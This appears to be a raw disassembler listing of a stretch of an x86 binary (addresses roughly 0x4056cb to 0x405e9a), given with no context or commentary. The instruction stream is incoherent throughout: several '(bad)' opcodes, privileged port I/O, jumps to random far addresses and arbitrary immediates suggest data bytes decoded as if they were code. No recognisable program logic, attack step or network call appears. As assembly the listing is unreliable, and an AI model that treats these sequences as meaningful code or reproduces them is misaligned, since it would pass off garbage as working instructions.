  4056cb:	mov    eax,ds:0x6b0b0ca6
  4056d0:	aam    0x22
  4056d2:	mul    BYTE PTR [edx-0xd418b01]
  4056d8:	adc    BYTE PTR [eax+0x32e99778],0x3c
  4056df:	rcl    DWORD PTR [ecx+edi*2],cl
  4056e2:	mov    esi,0x33768dc2
  4056e7:	mov    al,BYTE PTR [ebx-0x6cb431d9]
  4056ed:	mov    cl,0x91
  4056ef:	cmp    ah,BYTE PTR [eax+0x35ddd14e]
  4056f5:	sub    eax,0xc09767b2
  4056fa:	(bad)  
  4056fb:	sti    
  4056fc:	add    esi,DWORD PTR [esi+0x45]
  4056ff:	aam    0x3
  405701:	mov    al,ds:0xdf826797
  405706:	cmp    al,0x3f
  405708:	iret   
  405709:	inc    edx
  40570a:	xor    ch,cl
  40570c:	ret    0x5aff
  40570f:	daa    
  405710:	inc    esp
  405711:	pop    ecx
  405712:	punpcklwd mm2,DWORD PTR [ebp-0x3009e570]
  405719:	push   ecx
  40571a:	fbld   TBYTE PTR [ebx]
  40571c:	and    esp,DWORD PTR [eax]
  40571e:	pop    esi
  40571f:	js     0x4056f4
  405721:	popf   
  405722:	xchg   edx,eax
  405723:	and    al,0x2c
  405725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405726:	aam    0xea
  405728:	ins    BYTE PTR es:[edi],dx
  405729:	in     eax,0x8c
  40572b:	mov    ah,0xaa
  40572d:	push   es
  40572e:	mov    ch,BYTE PTR [edi]
  405730:	jbe    0x40575d
  405732:	dec    esp
  405733:	pop    DWORD PTR [ebx+eax*2]
  405736:	loop   0x405795
  405738:	cs fwait
  40573a:	gs push esi
  40573c:	and    DWORD PTR [edx+esi*8],esi
  40573f:	inc    edi
  405740:	push   ecx
  405741:	inc    ebp
  405742:	mov    edx,0x425ac038
  405747:	add    eax,0x5f606c8e
  40574c:	mov    esp,0x874b7dfd
  405751:	lods   al,BYTE PTR ds:[esi]
  405752:	and    DWORD PTR [edi+ebp*2],ebp
  405755:	dec    ecx
  405756:	mov    es,WORD PTR [edx-0x7e]
  405759:	je     0x4057d6
  40575b:	out    0xe3,al
  40575d:	cdq    
  40575e:	add    BYTE PTR [ecx+ebp*2-0x11ceaf00],cl
  405765:	leave  
  405766:	sbb    al,0xcc
  405768:	int3   
  405769:	stc    
  40576a:	cmp    dl,BYTE PTR [eax+0x7b994dcc]
  405770:	jecxz  0x405764
  405772:	stos   BYTE PTR es:[edi],al
  405773:	jg     0x405754
  405775:	ret    0x5e16
  405778:	sub    al,0xfd
  40577a:	pop    edx
  40577b:	jmp    0x40576d
  40577d:	xchg   ebp,eax
  40577e:	xor    DWORD PTR [ebp-0x5d],0x64
  405782:	jno    0x40577b
  405784:	lea    edi,[ebp+0x20]
  405787:	in     al,0xdc
  405789:	stc    
  40578a:	clc    
  40578b:	aam    0x68
  40578d:	add    BYTE PTR [edi],ch
  40578f:	aam    0xa6
  405791:	and    bl,dh
  405793:	leave  
  405794:	dec    esp
  405795:	push   ecx
  405796:	jle    0x405724
  405798:	add    dl,BYTE PTR ds:0x6bc570f2
  40579e:	fistp  DWORD PTR [edx-0x9]
  4057a1:	mov    BYTE PTR [edx-0x26],ch
  4057a4:	clc    
  4057a5:	test   eax,0xceb1c798
  4057aa:	jo     0x4057b1
  4057ac:	inc    ecx
  4057ad:	enter  0x9f7b,0x95
  4057b1:	in     eax,dx
  4057b2:	and    al,0xa5
  4057b4:	test   ebx,edx
  4057b6:	data16 js 0x4057d6
  4057b9:	sbb    al,0x64
  4057bb:	test   BYTE PTR [esi-0x29],0x8d
  4057bf:	mov    BYTE PTR gs:0x6b451d2d,bh
  4057c6:	scas   al,BYTE PTR es:[edi]
  4057c7:	aad    0xaf
  4057c9:	das    
  4057ca:	push   ebx
  4057cb:	scas   eax,DWORD PTR es:[edi]
  4057cc:	mov    es,WORD PTR [ebp+edx*8-0x7b59eff8]
  4057d3:	aaa    
  4057d4:	sub    al,0xb0
  4057d6:	push   ebx
  4057d7:	mov    edi,0x86c62db
  4057dc:	fwait
  4057dd:	addr16 xor esp,ebx
  4057e0:	fidivr DWORD PTR [ecx-0x19]
  4057e3:	push   ebx
  4057e4:	rcl    DWORD PTR [eax],cl
  4057e6:	pop    edi
  4057e7:	mov    ecx,0x5c86d552
  4057ec:	scas   eax,DWORD PTR es:[edi]
  4057ed:	jb     0x40579c
  4057ef:	lahf   
  4057f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057f1:	int3   
  4057f2:	pop    esi
  4057f3:	fisttp DWORD PTR [esi]
  4057f5:	jmp    0x15b1bf77
  4057fa:	shr    DWORD PTR [esi+0x10288546],cl
  405800:	push   eax
  405801:	xor    ecx,DWORD PTR es:[ecx+0x51]
  405805:	es push esp
  405807:	(bad)  
  405809:	retf   0xb63f
  40580c:	mov    dh,bl
  40580e:	sub    eax,0xaaa31346
  405813:	out    dx,al
  405814:	cmp    esi,DWORD PTR [ecx-0x52]
  405817:	fadd   DWORD PTR [edi]
  405819:	rol    ebx,0x81
  40581c:	push   ebx
  40581d:	mov    esi,DWORD PTR [ebp+esi*8-0x550aaeb5]
  405824:	dec    ecx
  405825:	repnz sti 
  405827:	and    esi,DWORD PTR [eax+0x6]
  40582a:	mov    ebp,esp
  40582c:	jmp    0x40585e
  40582e:	ss push ebx
  405830:	(bad)  
  405831:	lods   al,BYTE PTR ds:[esi]
  405832:	int3   
  405833:	test   al,0x7f
  405835:	sbb    bl,0x67
  405838:	sbb    al,0x4f
  40583a:	xlat   BYTE PTR ds:[ebx]
  40583b:	xor    BYTE PTR [edi+0x69749a35],bh
  405841:	or     al,0xa4
  405843:	test   eax,0x2b6151ae
  405848:	add    bl,dh
  40584a:	repz pop ebp
  40584c:	jbe    0x40589e
  40584e:	rol    esp,cl
  405850:	dec    edx
  405851:	cwde   
  405852:	mov    DWORD PTR [ebp-0x7],edi
  405855:	pop    esi
  405856:	push   0x155e8688
  40585b:	out    0x31,eax
  40585d:	cli    
  40585e:	push   edi
  40585f:	shr    BYTE PTR [ebp+0x6f75ab6],0x26
  405866:	jo     0x405812
  405868:	fnstsw WORD PTR [esi-0x58e990d6]
  40586e:	sbb    ebp,DWORD PTR [ecx+0x7f8fbb31]
  405874:	cli    
  405875:	xor    al,0x6c
  405877:	and    DWORD PTR [ecx+0xa83fbb0],edx
  40587d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40587e:	pop    esi
  40587f:	outs   dx,BYTE PTR ds:[esi]
  405880:	push   DWORD PTR [edx+0x5d]
  405883:	jmp    0x512f:0xcde1225c
  40588a:	push   ebx
  40588b:	repz aad 0xba
  40588e:	jg     0x40590f
  405890:	repnz pusha 
  405892:	outs   dx,DWORD PTR ds:[esi]
  405893:	(bad)  
  405894:	js     0x40587d
  405896:	daa    
  405897:	leave  
  405898:	mov    al,ds:0x662b784f
  40589d:	loope  0x405842
  40589f:	dec    eax
  4058a0:	jg     0x40586c
  4058a2:	hlt    
  4058a3:	pop    esi
  4058a4:	mov    ds:0x11ef2ad,eax
  4058a9:	dec    edi
  4058aa:	das    
  4058ab:	mov    ch,0x2b
  4058ad:	in     al,0xa4
  4058af:	push   eax
  4058b0:	adc    eax,0xabf44d25
  4058b5:	test   al,0xad
  4058b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b8:	mov    esp,0x2d431ed6
  4058bd:	scas   al,BYTE PTR es:[edi]
  4058be:	inc    edi
  4058bf:	icebp  
  4058c0:	test   al,0xa8
  4058c2:	out    dx,eax
  4058c3:	mov    edx,0xecc19175
  4058c8:	xchg   edx,eax
  4058c9:	dec    ebx
  4058ca:	jmpw   0x3aff
  4058ce:	push   edi
  4058cf:	push   ecx
  4058d0:	enter  0xf911,0x98
  4058d4:	push   esp
  4058d5:	icebp  
  4058d6:	pop    ebp
  4058d7:	mov    dh,0x8d
  4058d9:	ror    BYTE PTR [edx],0x81
  4058dc:	pop    es
  4058dd:	or     al,0x53
  4058df:	push   edi
  4058e0:	popa   
  4058e1:	in     eax,0x31
  4058e3:	dec    edx
  4058e4:	push   es
  4058e5:	into   
  4058e6:	in     al,dx
  4058e7:	ds cli 
  4058e9:	int3   
  4058ea:	mov    DWORD PTR [ebx-0x5d],0x23c76220
  4058f1:	pop    esp
  4058f2:	inc    esi
  4058f3:	ret    
  4058f4:	in     al,dx
  4058f5:	hlt    
  4058f6:	sbb    DWORD PTR [edi-0x202d3a1c],edx
  4058fc:	and    al,0xcc
  4058fe:	xchg   edx,eax
  4058ff:	enter  0x21bd,0xba
  405903:	jle    0x405921
  405905:	int    0x58
  405907:	scas   al,BYTE PTR es:[edi]
  405908:	into   
  405909:	inc    edi
  40590a:	add    DWORD PTR ds:0x1538a6cb,ebx
  405910:	in     eax,dx
  405911:	mov    ebp,0xab2da1d5
  405916:	or     eax,0xee2686e1
  40591b:	mov    eax,ds:0xf9226b7a
  405920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405921:	xor    BYTE PTR [edx+0x146f3f7f],bh
  405927:	mov    esp,0x71e73583
  40592c:	pusha  
  40592d:	aas    
  40592e:	add    BYTE PTR [ebp-0x3cebff42],ah
  405934:	lods   al,BYTE PTR ds:[esi]
  405935:	pop    edi
  405936:	std    
  405937:	mov    esi,0x4fda53e9
  40593c:	adc    dl,BYTE PTR [ebx+0x2f]
  40593f:	mov    ds:0x9c3412df,eax
  405944:	adc    al,0x2e
  405946:	popa   
  405947:	cmp    BYTE PTR [ebx],al
  405949:	push   edi
  40594a:	inc    edx
  40594b:	add    eax,0xa07c2c52
  405950:	mov    dh,0x71
  405952:	inc    edi
  405953:	ficomp DWORD PTR [edi-0x321cdec5]
  405959:	out    dx,eax
  40595a:	les    ebx,FWORD PTR [esi+0x24]
  40595d:	(bad)  
  40595e:	cmp    eax,0x25bfb119
  405963:	xchg   ebx,eax
  405964:	fcom   DWORD PTR [edx+edi*8+0xf]
  405968:	aas    
  405969:	mov    ebx,0x42d5794c
  40596e:	and    BYTE PTR [ebx-0x6a02da50],al
  405974:	pop    edx
  405975:	fistp  WORD PTR [edx-0x67]
  405978:	pop    ds
  405979:	pop    esp
  40597a:	or     eax,0xd1f861fb
  40597f:	ins    DWORD PTR es:[edi],dx
  405980:	std    
  405981:	xchg   edi,eax
  405982:	sub    DWORD PTR [edx+0x7fba9217],ebp
  405988:	inc    esi
  405989:	pop    eax
  40598a:	jecxz  0x40590f
  40598c:	or     DWORD PTR [eax-0x4a0253f4],ebp
  405992:	loopne 0x40597f
  405994:	clc    
  405995:	in     al,0xec
  405997:	lea    esp,[ebx]
  405999:	repnz int3 
  40599b:	repz jns 0x4059d7
  40599e:	or     esi,ebx
  4059a0:	jg     0x40595e
  4059a2:	pop    edi
  4059a3:	mov    ecx,ss
  4059a5:	cdq    
  4059a6:	mov    ch,0xfb
  4059a8:	cmp    DWORD PTR [eax+0xa],esp
  4059ab:	fcom   QWORD PTR [ecx-0x35]
  4059ae:	dec    BYTE PTR [edx-0x22]
  4059b1:	xchg   ebx,eax
  4059b2:	fst    QWORD PTR [ecx+0x3]
  4059b5:	mov    esp,0xeb7e1a55
  4059ba:	repnz pop edx
  4059bc:	xor    al,ah
  4059be:	xor    BYTE PTR [ebp+0x2ce8edf1],al
  4059c4:	das    
  4059c5:	fwait
  4059c6:	outs   dx,BYTE PTR ds:[esi]
  4059c7:	push   0x7dfb2dbf
  4059cc:	in     eax,0x5c
  4059ce:	mov    edx,DWORD PTR [ecx-0x34c55a89]
  4059d4:	jb     0x4059c4
  4059d6:	ror    DWORD PTR [edx+esi*8],0x57
  4059da:	lods   eax,DWORD PTR ds:[esi]
  4059db:	xlat   BYTE PTR ds:[ebx]
  4059dc:	jecxz  0x405a44
  4059de:	jno    0x40598b
  4059e0:	lock adc ah,BYTE PTR [ebx]
  4059e3:	push   ss
  4059e4:	dec    esi
  4059e5:	iret   
  4059e6:	push   ss
  4059e7:	arpl   ax,sp
  4059e9:	iret   
  4059ea:	dec    esp
  4059eb:	sbb    DWORD PTR gs:[edx-0x72d62a6],edi
  4059f2:	mov    bh,0x23
  4059f4:	dec    ebx
  4059f5:	mov    bh,0x3a
  4059f7:	adc    eax,0xb429a6d0
  4059fc:	sub    al,0xa6
  4059fe:	mov    cl,0xbd
  405a00:	scas   eax,DWORD PTR es:[edi]
  405a01:	jmp    0x640ada67
  405a06:	neg    ebx
  405a08:	jg     0x405a06
  405a0a:	inc    esp
  405a0b:	mov    bh,0x9e
  405a0d:	jb     0x405a23
  405a0f:	cmc    
  405a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a11:	outs   dx,BYTE PTR ds:[esi]
  405a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a13:	mov    ebx,0x7d127ab6
  405a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a19:	cmc    
  405a1a:	lea    ebp,[ecx-0x69dbcebf]
  405a20:	dec    esi
  405a21:	mov    ch,0x90
  405a23:	test   DWORD PTR [ecx-0x60f4fd4f],0x2bf7b558
  405a2d:	test   DWORD PTR [esi-0x58a77102],edx
  405a33:	dec    esp
  405a34:	or     DWORD PTR [ebx-0x64],ebx
  405a37:	pop    edi
  405a38:	cmc    
  405a39:	cs stos DWORD PTR es:[edi],eax
  405a3b:	sub    cl,BYTE PTR [edx+0x4d]
  405a3e:	mov    esi,0x17aa051f
  405a43:	jle    0x4059ea
  405a45:	push   edi
  405a46:	sahf   
  405a47:	jne    0x405a40
  405a49:	int3   
  405a4a:	xor    al,0x51
  405a4c:	out    0x97,eax
  405a4e:	rcl    DWORD PTR [ecx-0x6a39189d],1
  405a54:	cdq    
  405a55:	out    dx,al
  405a56:	clc    
  405a57:	es add eax,0x92e00083
  405a5d:	add    al,0x4a
  405a5f:	pop    ebx
  405a60:	dec    eax
  405a61:	fstp   DWORD PTR [ebp+ecx*1-0x4c]
  405a65:	gs verr bp
  405a69:	ficomp WORD PTR [edx+0x69f6a5fa]
  405a6f:	xchg   ebp,eax
  405a70:	test   DWORD PTR [ebx+0x62],ebx
  405a73:	mov    WORD PTR [ebp+0x1b8e5cc9],ss
  405a79:	lds    eax,FWORD PTR [ebx+0x1]
  405a7c:	rcr    bh,cl
  405a7e:	cmp    al,BYTE PTR [eax-0x13]
  405a81:	jp     0x405afb
  405a83:	jp     0x405a1f
  405a85:	push   edx
  405a86:	daa    
  405a87:	xor    ah,BYTE PTR [esi-0x55fc4ac7]
  405a8d:	mov    eax,0xffd469e0
  405a92:	and    eax,0x78f912e5
  405a97:	mov    fs,WORD PTR [ebx-0x32341693]
  405a9d:	mov    edi,0xc58ae615
  405aa2:	or     al,0xe5
  405aa4:	imul   esp,DWORD PTR [ebx-0x1f],0xffffff82
  405aa8:	pop    ss
  405aa9:	jmp    DWORD PTR [edx-0x14049762]
  405aaf:	and    ebx,DWORD PTR [edi+0x5a]
  405ab2:	xchg   DWORD PTR es:0x36b5a212,esi
  405ab9:	adc    BYTE PTR [ebp-0x1e],0xf4
  405abd:	fistp  DWORD PTR [eax+0x4c]
  405ac0:	in     al,dx
  405ac1:	xchg   edx,eax
  405ac2:	shl    BYTE PTR ds:0xe3ed0746,0xbf
  405ac9:	fist   DWORD PTR [eax+0x5cfd56df]
  405acf:	popf   
  405ad0:	retf   0x9542
  405ad3:	test   eax,0x1dfb5d22
  405ad8:	sub    eax,0xd8f3131b
  405add:	or     al,0x1
  405adf:	sub    eax,0x63f43dda
  405ae4:	in     eax,0x55
  405ae6:	(bad)  
  405ae7:	lahf   
  405ae8:	push   ss
  405ae9:	cmp    cl,BYTE PTR [ecx-0x6b]
  405aec:	pop    DWORD PTR [esi]
  405aee:	out    0xd4,eax
  405af0:	pop    esp
  405af1:	or     BYTE PTR [ebx-0x41],0xba
  405af5:	adc    eax,eax
  405af7:	adc    eax,0xfa95b207
  405afc:	sub    DWORD PTR ds:0x292db7f,esp
  405b02:	mov    edi,0x74203fe8
  405b07:	mov    ch,0x7f
  405b09:	inc    ebx
  405b0a:	ds add eax,0xdc227c67
  405b10:	jnp    0x405b02
  405b12:	popa   
  405b13:	cdq    
  405b14:	es in  al,0x97
  405b17:	sbb    ebp,DWORD PTR [ebp+0x1ac4ed95]
  405b1d:	and    ch,BYTE PTR [ebp-0xe0254f]
  405b23:	push   ebp
  405b24:	sbb    ecx,DWORD PTR [ebp+0x65599c9d]
  405b2a:	push   esi
  405b2b:	sub    bl,dh
  405b2d:	dec    ebp
  405b2e:	jmp    0x665ef0b9
  405b33:	cmp    esp,DWORD PTR [ebx+0x40]
  405b36:	sti    
  405b37:	xchg   esp,eax
  405b38:	mov    bl,0x7f
  405b3a:	(bad)  
  405b3b:	in     eax,dx
  405b3c:	(bad)
  405b41:	(bad)  
  405b43:	pushf  
  405b44:	addr16 xchg edi,eax
  405b46:	xchg   ecx,eax
  405b47:	mov    ds:0xcaab5656,eax
  405b4c:	push   ecx
  405b4d:	xor    BYTE PTR [esi+esi*2-0x30],ah
  405b51:	aas    
  405b52:	jne    0x405b1f
  405b54:	push   0x5f
  405b56:	add    eax,0x8278a6aa
  405b5b:	xor    BYTE PTR [eax],cl
  405b5d:	xchg   edi,eax
  405b5e:	jg     0x405b91
  405b60:	adc    al,0x63
  405b62:	adc    BYTE PTR [ecx],dh
  405b64:	ss dec ebp
  405b66:	mov    al,0x37
  405b68:	stos   BYTE PTR es:[edi],al
  405b69:	in     al,0x91
  405b6b:	sti    
  405b6c:	rcr    BYTE PTR [esp+esi*1-0x72ea0a7e],cl
  405b73:	retf   
  405b74:	and    al,0xa7
  405b76:	cmp    al,0x29
  405b78:	mov    al,ds:0x58da2d7b
  405b7d:	xchg   esp,eax
  405b7e:	pop    esi
  405b7f:	push   ebx
  405b80:	cdq    
  405b81:	int    0x41
  405b83:	enter  0xf771,0x65
  405b87:	fst    QWORD PTR [edi]
  405b89:	xchg   ebx,eax
  405b8a:	lahf   
  405b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b8c:	add    al,0x62
  405b8e:	mov    bl,0x9f
  405b90:	xor    eax,0xd43dc706
  405b95:	add    eax,0xe5e84c81
  405b9a:	retf   
  405b9b:	pushf  
  405b9c:	mov    ch,0x77
  405b9e:	push   0xf0f83edc
  405ba3:	test   al,0xf4
  405ba5:	out    dx,al
  405ba6:	sbb    bh,al
  405ba8:	not    edi
  405baa:	xlat   BYTE PTR ds:[ebx]
  405bab:	jns    0x405bcd
  405bad:	mov    al,BYTE PTR [ebx+esi*1-0x2e]
  405bb1:	scas   eax,DWORD PTR es:[edi]
  405bb2:	leave  
  405bb3:	test   BYTE PTR [ebx+0x75],bh
  405bb6:	jae    0x405bbe
  405bb8:	cmp    BYTE PTR [ecx+0xb],al
  405bbb:	sti    
  405bbc:	cmp    eax,0x6f107398
  405bc1:	dec    esp
  405bc2:	xchg   DWORD PTR [eax-0x1cfd17a0],edx
  405bc8:	je     0x405b72
  405bca:	cwde   
  405bcb:	jno    0x405bdd
  405bcd:	sbb    eax,0x7cef7d2a
  405bd2:	pusha  
  405bd3:	fdiv   st,st(3)
  405bd5:	aaa    
  405bd6:	sub    eax,0xdb176b37
  405bdb:	jle    0x405bcd
  405bdd:	dec    ebp
  405bde:	fwait
  405bdf:	xor    eax,0x28886e1e
  405be4:	rol    esi,1
  405be6:	lea    ebp,[ecx-0x6f139628]
  405bec:	stos   BYTE PTR es:[edi],al
  405bed:	stc    
  405bee:	(bad)  
  405bef:	stos   BYTE PTR es:[edi],al
  405bf0:	mov    eax,ds:0xa738c65
  405bf5:	pop    esp
  405bf6:	push   cs
  405bf7:	jmp    0x405bd4
  405bf9:	in     eax,dx
  405bfa:	push   0x9f1a9da6
  405bff:	push   0x989e9fb7
  405c04:	adc    eax,0x3ce391b
  405c09:	sbb    dl,BYTE PTR [edi]
  405c0b:	mov    eax,ds:0xdb6cb343
  405c10:	sbb    BYTE PTR [ebx-0x16],cl
  405c13:	dec    eax
  405c14:	out    dx,al
  405c15:	cmc    
  405c16:	xchg   edi,eax
  405c17:	dec    ebp
  405c18:	cmc    
  405c19:	fstp   DWORD PTR [edx+0x4]
  405c1c:	add    BYTE PTR [ecx+0x2],bl
  405c1f:	dec    esp
  405c20:	loopne 0x405c50
  405c22:	call   0xb320f039
  405c27:	shr    bl,cl
  405c29:	push   es
  405c2a:	and    BYTE PTR [edi-0x33b97eaf],dl
  405c30:	push   ebx
  405c31:	fnstcw WORD PTR [eax+eiz*4]
  405c34:	mov    ecx,0xdadcc89
  405c39:	mov    eax,0xe5220e3d
  405c3e:	pop    edx
  405c3f:	call   0x9dcf354a
  405c44:	je     0x405c36
  405c46:	out    dx,eax
  405c47:	mov    ebp,0xdef280b
  405c4c:	push   esi
  405c4d:	dec    edi
  405c4e:	sbb    al,0x40
  405c50:	push   eax
  405c51:	sbb    edx,ebx
  405c53:	retf   0x7a9f
  405c56:	cli    
  405c57:	sub    bh,BYTE PTR [ebx+0x10]
  405c5a:	mov    ebx,0x94253960
  405c5f:	push   esi
  405c60:	je     0x405c43
  405c62:	cmp    DWORD PTR [eax-0x2f9b796b],0xf0f52601
  405c6c:	test   BYTE PTR [ebx],0x26
  405c6f:	nop
  405c70:	and    eax,0x7d1dfd2d
  405c75:	mov    ecx,0x78854fd4
  405c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c7b:	loop   0x405cc9
  405c7d:	shl    ch,0xdd
  405c80:	js     0x405c27
  405c82:	pop    es
  405c83:	mov    ebx,0x725f422b
  405c88:	xchg   ecx,eax
  405c89:	inc    edi
  405c8a:	mov    dh,0x5
  405c8c:	les    edi,FWORD PTR [ecx-0x3f13481c]
  405c92:	or     dh,BYTE PTR [esi]
  405c94:	or     al,0x56
  405c96:	pop    edi
  405c97:	mov    ch,0x39
  405c99:	xchg   edx,eax
  405c9a:	mov    ecx,0x10eb6497
  405c9f:	bound  ebp,QWORD PTR ds:0x2a0f8a61
  405ca5:	push   eax
  405ca6:	cdq    
  405ca7:	xor    eax,0x88f3b827
  405cac:	sub    edi,DWORD PTR ds:0x50ed3a49
  405cb2:	in     eax,0x3f
  405cb4:	fdiv   QWORD PTR [ecx]
  405cb6:	cld    
  405cb7:	jns    0x405c58
  405cb9:	rol    DWORD PTR ds:[eax+0x32],0xf
  405cbe:	mov    BYTE PTR [eax+eax*1],al
  405cc1:	lgs    eax,FWORD PTR [esi-0x1f]
  405cc5:	mov    al,0x2a
  405cc7:	(bad)  
  405cc8:	enter  0xe07b,0x8a
  405ccc:	addr16 clc 
  405cce:	inc    ebp
  405ccf:	mov    edi,0xcf963fcc
  405cd4:	xchg   BYTE PTR [edx+eax*1+0x6d6cdae4],ch
  405cdb:	mov    DWORD PTR [esi],edi
  405cdd:	mov    edx,0x772e378a
  405ce2:	shl    BYTE PTR [edx-0x3759ab2f],cl
  405ce8:	dec    edx
  405ce9:	push   esp
  405cea:	int    0x80
  405cec:	xor    al,0x67
  405cee:	outs   dx,DWORD PTR ds:[esi]
  405cef:	add    al,0xc
  405cf1:	leave  
  405cf2:	loop   0x405c89
  405cf4:	sub    DWORD PTR [eax],0xe6ea1e2f
  405cfa:	popf   
  405cfb:	in     al,dx
  405cfc:	add    dl,BYTE PTR [edi]
  405cfe:	test   DWORD PTR [ebx],eax
  405d00:	dec    esp
  405d01:	test   ebx,ebx
  405d03:	mov    ah,BYTE PTR [eax-0x5217fe0b]
  405d09:	shl    BYTE PTR [edi+0x3d],1
  405d0c:	mov    ds:0xa27b0793,al
  405d11:	xlat   BYTE PTR ds:[ebx]
  405d12:	retf   
  405d13:	call   0xe6007111
  405d18:	mov    ah,0x9f
  405d1a:	xchg   ebx,eax
  405d1b:	pop    edx
  405d1c:	outs   dx,BYTE PTR ds:[esi]
  405d1d:	pop    eax
  405d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d1f:	in     eax,0xd2
  405d21:	mov    ds:0x58984f88,al
  405d26:	dec    ecx
  405d27:	aam    0xa
  405d29:	das    
  405d2a:	mov    ecx,0xa8b7048
  405d2f:	dec    ecx
  405d30:	scas   al,BYTE PTR es:[edi]
  405d31:	mov    al,ds:0xdd101f3d
  405d36:	repnz pop ebp
  405d38:	mov    edi,0xc866c83d
  405d3d:	sub    eax,DWORD PTR [ecx-0x277ff94f]
  405d43:	div    DWORD PTR [edx]
  405d45:	ins    DWORD PTR es:[edi],dx
  405d46:	and    DWORD PTR ds:0xe2ed3130,ebp
  405d4c:	mov    ecx,0x6732e02b
  405d51:	lods   al,BYTE PTR ds:[esi]
  405d52:	jno    0x405d74
  405d54:	cmp    al,0xb8
  405d56:	mov    edx,0x5449d50d
  405d5b:	sbb    BYTE PTR [edx],dl
  405d5d:	rcl    BYTE PTR [edi-0xdbffdfb],1
  405d63:	inc    eax
  405d64:	jne    0x405d61
  405d66:	jle    0x405d0c
  405d68:	mov    edx,0x4c52de8b
  405d6d:	xchg   BYTE PTR [ebx],al
  405d6f:	call   0xa9413429
  405d74:	push   0xf8e04db4
  405d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d7b:	or     ch,BYTE PTR [ebp-0x779366f5]
  405d81:	mov    edx,0x48994ccb
  405d86:	scas   eax,DWORD PTR es:[edi]
  405d87:	add    BYTE PTR [edi+0x79e9fe8e],dh
  405d8d:	inc    edx
  405d8e:	lock pop es
  405d90:	dec    esp
  405d91:	mov    cl,0x23
  405d93:	mov    ebx,0xef6c4859
  405d98:	add    bh,BYTE PTR [edi]
  405d9a:	out    0x38,eax
  405d9c:	test   al,0x57
  405d9e:	dec    ecx
  405d9f:	inc    eax
  405da0:	cmp    eax,0x5a412488
  405da5:	pop    ebp
  405da6:	cwde   
  405da7:	mov    edx,DWORD PTR [eax-0x1b]
  405daa:	or     ebx,DWORD PTR [edi-0x7a]
  405dad:	or     al,0x64
  405daf:	mov    es,WORD PTR [ebp+ebx*1-0x6a960af5]
  405db6:	or     DWORD PTR [ecx+esi*4],esi
  405db9:	mov    edx,DWORD PTR [ebp-0x62]
  405dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dbd:	pop    ss
  405dbe:	pop    ebx
  405dbf:	mov    bl,0xe8
  405dc1:	in     al,dx
  405dc2:	jns    0x405dd0
  405dc4:	cmp    al,0x65
  405dc6:	aam    0xf4
  405dc8:	dec    ebp
  405dc9:	jg     0x405d5f
  405dcb:	sbb    dl,BYTE PTR [eax-0x7bcba9a5]
  405dd1:	lock test BYTE PTR [ecx+edi*1],cl
  405dd5:	xor    eax,0x7468cd9
  405dda:	xchg   esp,eax
  405ddb:	cmp    ebp,esi
  405ddd:	jb     0x405e5a
  405ddf:	cmp    ebx,DWORD PTR [edx+0x43]
  405de2:	mov    ebp,0x96d7caff
  405de7:	cmp    ebp,eax
  405de9:	ds push 0x2299aaaa
  405def:	cmp    ebp,DWORD PTR [eax-0x80]
  405df2:	cmp    al,0x8
  405df4:	fidiv  DWORD PTR [ecx-0x1f5e9ccc]
  405dfa:	loope  0x405dd8
  405dfc:	jns    0x405da4
  405dfe:	push   ecx
  405dff:	mov    cs,esi
  405e01:	dec    ebx
  405e02:	scas   al,BYTE PTR es:[edi]
  405e03:	mov    edx,0xb0e3d7de
  405e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e09:	inc    esp
  405e0a:	mov    dl,0x85
  405e0c:	and    bh,BYTE PTR [edx+ebp*2]
  405e0f:	mov    DWORD PTR [eax],eax
  405e11:	xor    al,0xd
  405e13:	add    al,0x86
  405e15:	stos   DWORD PTR es:[edi],eax
  405e16:	cmovae eax,DWORD PTR [ebx-0x1c]
  405e1a:	mov    eax,ds:0xa4b387a7
  405e1f:	push   es
  405e20:	loop   0x405dc4
  405e22:	push   ds
  405e23:	jns    0x405e5a
  405e25:	push   eax
  405e26:	jnp    0x405e92
  405e28:	nop
  405e29:	mov    ch,0x1f
  405e2b:	adc    esp,DWORD PTR cs:[ebx]
  405e2e:	mov    bh,0x2a
  405e30:	or     eax,0xf10df780
  405e35:	(bad)
  405e39:	out    0x36,al
  405e3b:	adc    al,0x18
  405e3d:	cmc    
  405e3e:	aaa    
  405e3f:	cmp    DWORD PTR [eax-0x48],0x1d
  405e43:	sub    al,0x72
  405e45:	jae    0x405e38
  405e47:	adc    eax,0x873e5e39
  405e4c:	sub    edi,DWORD PTR ds:0x21acc922
  405e52:	mov    ebp,0xe9104e41
  405e57:	rol    DWORD PTR [edx+0x6c],0x99
  405e5b:	idiv   DWORD PTR [ebx+0x33]
  405e5e:	imul   ecx,DWORD PTR [ebp-0x6b],0xffa44cf4
  405e65:	sbb    eax,0x3e4e8b6e
  405e6a:	cli    
  405e6b:	and    eax,0x446fac6c
  405e70:	dec    ecx
  405e71:	int3   
  405e72:	hlt    
  405e73:	mov    dh,0x82
  405e75:	aad    0x7e
  405e77:	dec    eax
  405e78:	outs   dx,BYTE PTR ds:[esi]
  405e79:	aam    0x93
  405e7b:	enter  0x9d62,0xdf
  405e7f:	ins    DWORD PTR es:[edi],dx
  405e80:	pop    esi
  405e81:	xlat   BYTE PTR ds:[ebx]
  405e82:	push   esp
  405e83:	ja     0x405e70
  405e85:	push   esp
  405e86:	mov    esp,0x1da23f67
  405e8b:	out    dx,al
  405e8c:	mov    BYTE PTR [edi+0x35ad8e18],bh
  405e92:	add    ecx,0xfffffff1
  405e95:	in     al,dx
  405e96:	js     0x405eb2
  405e98:	into   
  405e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e9a:	sub    eax,DWORD PTR [eax+0x7d20125d]
